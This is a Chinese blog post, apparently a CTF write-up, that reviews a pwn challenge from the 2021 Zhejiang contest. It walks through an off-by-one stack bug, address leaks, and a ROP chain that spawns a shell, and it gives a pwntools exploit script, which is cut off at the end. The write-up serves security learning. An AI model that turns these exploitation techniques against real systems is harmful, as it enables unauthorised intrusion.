@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="xia0ji233" />
+
+
+
+<meta name="description" content="这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021浙江省赛pwn2复盘">
+<meta property="og:url" content="http://example.com/2021/11/06/zjctf2021%20pwn2/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s blog">
+<meta property="og:description" content="这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/1.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/2.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/3.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/4.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/5.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/6.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/7.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/8.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/9.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/10.png">
+<meta property="og:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/11.png">
+<meta property="article:published_time" content="2021-11-06T14:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-12T02:56:10.595Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/11/06/zjctf2021%20pwn2/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="xia0ji233&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>2021浙江省赛pwn2复盘 | xia0ji233&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">xia0ji233</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习应该像呼吸一样自然</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/friends">友链</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2636876456&Site=xia0ji233&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"> </a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/friends">友链</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2636876456&Site=xia0ji233&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-zjctf2021 pwn2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/06/zjctf2021%20pwn2/" class="article-date">
+      <time datetime="2021-11-06T14:00:00.000Z" itemprop="datePublished">2021-11-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2021浙江省赛pwn2复盘
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。</p>
+<span id="more"></span>
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先checksec发现保护全开了，ida打开，主函数是一个while 1 循环且没有return，如果要栈溢出得在其它函数。首先ida分析有部分不到位，有一个很明显的值赋值指针，然后后面还有对指针之后的元素读取一个int型变量，很明显栈布局是这样的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure>
+
+<p>然后我们去混淆一下，去除那个指针刚好是31个int_64，把它改变一下就是char buf[248]，如下更方便分析(isnan函数是因为去除了alarm方便调试)</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p>
+<p>可以很明显的看到中间有两层检测，但是一旦不满足最外层那个检测那么就会循环输出<code>too easy</code>，因此我们看看这个判断是什么，这个判断的意思就是我们的指针只有在&gt;=缓冲区地址或者&lt;=rbp-0x220才允许执行下面的流程。因为栈是向低地址增长，所以第一个判断就是ptr要落在buf或者buf下面(栈底方向)。如果我们有机会修改ptr，那确实可以通过ptr任意写，而我们之前分析的是不能通过main函数溢出，所以往后面写没多大用处，那么我们看看第二个条件。意思大概就是如果不在buf下面，那么在上面也要离buf有一定距离，这个距离是rbp-0x220，然后buf最顶端距离rbp是0x120，所以指针不能落在(buf-0x100,buf)范围内因为判过有等号，所以判不过自然是开区间。</p>
+<p>size只能0x100以内，观察类型发现判断的时候类型为unsigned，不能负溢。那么进入myputs，myread和mywrite查看。</p>
+<p>myputs：单个字符输出，遇到\0停止输出。</p>
+<p>mywrite：固定逐字节输出那么长的字节序列。</p>
+<p>myread：也是逐字节读入那么长的序列，并且while  read(1)表示必须要读那么多的字节，但是注意他循环是从0，然后对size判断的时候加了等号，这就意味着能够多读入一个字节，存在off by one。</p>
+<p>buf距离ptr刚好0x100字节，如果溢出一个字节那么可以溢出一个较大字节，使得等会通过这个指针输出的时候能够输出后面的栈内容。</p>
+<h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>我们通过之前分析的内构造以下内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libc中寻找的</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p>
+<p>可以看到后面输出了很多东西，但是因为栈不存在内存页对齐的说法，所以最后一个字节改大之后能输出多少东西全凭运气。我们可以在输入之后用gdb attach去查看此时栈的情况看看能泄露什么东西。由于没有去符号表，因此为了方便定位代码我们直接在后面加上b mywrite。</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p>
+<p>圈出来的是指针末尾被改了的情况，然后三个箭头是可以泄露的东西，分别能泄露栈，libc和程序的加载基址。但是如果buf本身所在位置的最低字节就是e0,f0之类的那可能泄露不了这么多东西，所以这一点也是看脸的。那么我们如何接收泄露的数据呢？</p>
+<p>首先我们第一个泄露的地址应该是ptr，但是ptr被我们改过，我们并具体泄露出这个buf在哪个位置。所以这个我们不考虑，我们接受后面的栈地址，计算一下泄露地址和buf的偏移得到buf地址。后面的没啥好说的，就是开了pie之后程序加载基址不知道具体会在哪，不过据我观察它大部分高字节是55，有时候是56，所以我们就以55判断吧。但是为了调试方便我们选择先关闭aslr调试，具体细节就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>关闭之后开了aslr的程序固定加载在0x555555554000上面，所以我们选择以四个字节的55来判断是否有没有泄露到程序加载基址，等到打远程的时候调回来就行了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#因为一开始指向劫持这个忽略了条件不允许，这里到后来也没改，问题不大，之后在引用这个值的时候+8就完事了。</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#用的是libc的gadget，用本身的gadget加上code_base即可</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我关了aslr的调试结果</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>泄露了这三个基址之后，我们就要考虑在哪里劫持程序流了。got表因为开了保护无法劫持，我们只能劫持函数，唯一具有输入功能的就是my_read函数，所以肯定是在这里溢出。我们之前讨论过我们的ptr能劫持的位置是有限制的。</p>
+<p>如果我们把指针刚好劫持在buf-0x100，然后读入0x100字节的数据能否溢出呢？答案当然是可以的，因为buf是main函数的栈顶了，再上去就是其它函数的栈帧了，就算这0x100字节不能碰到buf，那碰到上面函数的返回地址还是可以的。这便是这题的巧妙之处了，这里我想了很久。但是要注意，我们是逐字节输入的，并不是一口气输入完的，所以里面的一些变量不能破坏。这里具体要自己调试了，它中间好像有把循环截止条件的那个数，也就是第三个参数放到栈上，因为我覆盖过去直接就无了，循环直接退出了。还有一个就是jmp 的时候也有用到栈上的地址跳转，因为我使用e覆盖的，然后我那个指令直接就跳到了0xXXXXX65的地方，然后就crash了，所以这个地方大概率是要放上正确的跳转地址的。因为是逐字节填充，所以这里是肯定劫持不了程序的，我们只能尽量不破坏它程序的执行，我们的最终目标其实也就填上那8个字节其它是什么其实无所谓，只要能成功劫持那八个字节，我们就能控制程序流。</p>
+<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>这题可以执行system(“/bin/sh”)，因此我们先构造rop链。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>pop_rdi_ret的gadget可以使用elf的，也可以用库的，这个看自己心情，我因为一开始没有选择接受程序基址就选择了libc的gadget。因为我们只能劫持八个字节，那么执行了pop_rdi_ret之后程序ret到哪里了呢，我们先画出当时整个栈结构。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，返回地址后面紧跟着的就是buf，buf我们一开始是可控的，但是一开始我们并不知道system和/bin/sh的地址，因此这里我们需要选择把指针恢复填上p64(sh)+p64(system_addr)，这样当劫持my_read函数的时候就会形成rop链。那么接下来要如何把指针劫持回去呢，因为我们用的是\xff字节去填充了最低位，现在我们如果写，将不会从buf的地方开始而是会从(buf_addr|0xff)，这也是一开始选取\xff字节的目的，因为它八个都是1，在最后计算的时候直接或上去就可以了，如果选取其它的可能就要进行一些复杂的运算，比如\xfe字节你可能就得这么写。</p>
+<p>(buf_addr&amp;0xffffffffff00)|0xfe</p>
+<p>这个应该都能理解吧，因为我们是覆盖操作，但是如果覆盖位数都为1就可以直接或上去，不用再&amp;清除低位字节。</p>
+<p>而我们的目标地址在buf_addr+0x100，所以只需要算这个偏移就行了。这偏移也是很好算的，我们从buf_addr|0xff开始写，然后终点是buf_addr+0x100，两个一减就能算出填充字节的位数了，然后再加上buf_addr指针给他写回去。好了之后呢，就是开头放上p64(sh)+p64(system_addr)然后依然要溢出ff字节，不然只能溢出一个字节不足以能肯定改变指针到我们想的地方。所以重复一开始的操作溢出为0xff，然后再劫持到buf_addr-0x100的地方去。</p>
+<p>改回指针并且重写再次溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#再次注意一下，我的stack_addr是buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#这里需要加个ret平衡栈，后面注意到了就知道在这里加一个就行</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span class="comment">#就跟改回来是一样的，截图并未执行到这里</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p>
+<h3 id="劫持my-read"><a href="#劫持my-read" class="headerlink" title="劫持my_read"></a>劫持my_read</h3><p>一开始可能想的会有点简单，直接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#也是因为这个填充字符选的到位，导致能快速找出错误，所以如果程序退出异常但还能继续执行不妨改一下填充字符哦</span></span><br></pre></td></tr></table></figure>
+
+<p>但是会发现程序直接死了，这里就来复原一下我复盘时出的问题，先用这个最简单的payload试试看问题出在哪里。</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p>
+<p>会发现这个指令非常奇奇怪怪，而且rip此时最低那个字节的值是65刚好就是e的ASCII码，再disass一下发现这个函数根本没有指到这个位置上的指令，可以很清楚的知道，这条指令是被分割了，那么我们回溯栈看看，发现我们覆盖了什么导致这个问题。可以看到次时i的值就是0xb8，那么我们就调试到i=0xb7的时候，观察接下来要覆盖的值是什么。</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p>
+<p>可以发现接下来要覆盖的字节应该就是两个箭头所指的地方，而右边这里刚好有一个在程序的code段的地址，猜测刚刚应该是覆盖了这里的最低位导致的问题。并且我们刚刚的rip错误指向就是0x555555555365，刚好就是那个地址低字节覆盖了0x65字节导致的问题，我们先来观察一下这个地址在哪里。</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p>
+<p>可以发现刚好在myread中有这么一个地址，那么看到它在read函数下面应该能想到，这个是在调用read的时候保存的返回地址，读完之后改变了这个返回地址导致了出现这个错误。因为在这里调用read返回地址肯定知道就是在函数的这个位置，那么它在code_base上偏移是固定的，算出偏移之后这个地方的8个字节就固定填写这个不要改变了。此时我们的payload变成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>但是发现执行着突然退出了，而当时i的值还是0xc8</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p>
+<p>到底是为什么呢，应该能稍微猜到一点，因为可以看到rsp的那个地方已经填充好了8个e接下来就要向0xff那边填充了，0xff是循环条件的一个值，猜测是因为这个值被覆盖了导致循环提前结束了，那么在长度到0xc8的时候，这个位置应该填上一个p64(0xff)才能过去，然后后面又有一个地址，不难发现它是我们buf_addr的地址，那么这个地址也不应该被覆盖，而应该写回去。同理，下面的i作为循环变量也不应该被覆盖，这个应当能提前预测到的。</p>
+<p>至于这个位置应该写多少呢，可以想想如果i=0的时候写自己应该写多少呢？答案当然是还是写个0才能保证写进去并且i+1。那么这个位置在哪呢，应该不难推测出开始覆盖ret_addr的时候，它的值应当i=0xf8，覆盖之前的rbp时，i=0xf0，那么再往前推，这个值应该是i=0xe8，所以这个地方给上\xe8然后后面一律填0即可。可以看到这次栈溢出注意的东西也是非常多的，可以说这题目出的也是相当好的。</p>
+<p>最后就没什么讲究了，覆盖上ret_addr为pop_rdi_ret的gadget就能直接getshell。下面是完整payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p>
+<p>能稳定getsehll，但是前提是aslr关了，aslr关了调试其实是非常舒服的，因为面对复杂的情况有时候可能不能getshell，就比如前面举过的例子，程序基址的最高字节非\x55，buf_addr的最低字节过大，目前已知就这两种情况会导致无法正常getshell。</p>
+<p>这里还需要注意一点，因为关了aslr，我们前面的接受泄露的地址是用的p.recvuntil(b’\x55’*4)[-6:]，关了之后要把后面那个4去掉，这里因为识别单个字节，不排除会识别错误，这个随机加载谁说的清楚呢，这都是小问题。下面给出我开了aslr的运行结果。</p>
+<p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p>
+<p>如果希望能一把梭，那么可以把攻击的部分作为一个函数，然后主函数while 1 try except这样玩，但是要注意给开头四个recvuntil都加上一个参数timeout=0.5，这样它接收不到这个字节超过0.5秒就会停止接收，后面就会产生报错，报错之后自己会重新运行一遍。注意下面给的exp并没有加上这个，但是加的方法已经告诉你了。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span 